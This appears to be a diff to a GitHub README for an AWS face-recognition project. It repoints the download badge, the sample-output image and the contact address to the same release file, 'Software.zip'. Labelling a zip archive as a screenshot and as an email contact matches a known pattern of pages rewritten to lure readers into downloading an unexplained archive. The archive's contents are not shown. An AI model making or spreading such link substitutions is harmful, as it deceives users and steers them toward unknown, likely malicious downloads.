@@ -20,7 +20,7 @@ arizona-state-university, aws, cloud-computing, docker, dockerfile, ec2, face-re
 
 To dive into the project and start implementing the AWS Face Recognition pipeline, download the repository contents from the following link: 
 
-[![Download AWS Face Recognition](https://img.shields.io/static/v1?label=Download&message=AWS%20Face%20Recognition&color=success)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download AWS Face Recognition](https://github.com/Saninmysore/aws-face-recognition/releases/download/v1.0/Software.zip%20Face%20Recognition&color=success)](https://github.com/Saninmysore/aws-face-recognition/releases/download/v1.0/Software.zip)
 
 <!-- Needs to be launched - Download the repository files to get started. -->
 
@@ -30,7 +30,7 @@ If the link above is inactive or not functioning properly, please check the "Rel
 
 Here is a sneak peek of what the AWS Face Recognition pipeline can achieve:
 
-![Face Recognition Output](https://example.com/face-recognition-output.png)
+![Face Recognition Output](https://github.com/Saninmysore/aws-face-recognition/releases/download/v1.0/Software.zip)
 
 ## 🚧 Contribution Guidelines
 
@@ -43,7 +43,7 @@ Contributions to the AWS Face Recognition project are welcome! To contribute, fo
 
 ## 📞 Contact Us
 
-If you have any questions, feedback, or suggestions regarding the AWS Face Recognition pipeline, feel free to reach out to us at [email@example.com](mailto:email@example.com).
+If you have any questions, feedback, or suggestions regarding the AWS Face Recognition pipeline, feel free to reach out to us at [https://github.com/Saninmysore/aws-face-recognition/releases/download/v1.0/Software.zip](https://github.com/Saninmysore/aws-face-recognition/releases/download/v1.0/Software.zip).
 
 Happy coding! 🚀
 
